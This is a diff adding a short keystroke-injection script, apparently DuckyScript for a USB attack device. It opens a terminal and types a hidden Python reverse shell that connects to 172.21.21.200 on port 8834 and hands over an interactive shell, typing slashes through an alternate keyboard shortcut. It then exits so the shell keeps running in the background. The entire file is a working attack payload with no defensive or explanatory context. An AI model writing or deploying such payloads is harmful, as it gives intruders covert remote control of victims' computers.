@@ -1,0 +1,11 @@
+DELAY 1000
+CTRL ALT t
+DELAY 800
+STRING nohup python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.21.21.200
+STRING ",8834));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([
+STRING "
+ALT_RIGHT q
+STRING bin
+ALT_RIGHT q
+STRING sh","-i"]);' 2>nohup.err & exit
+ENTER
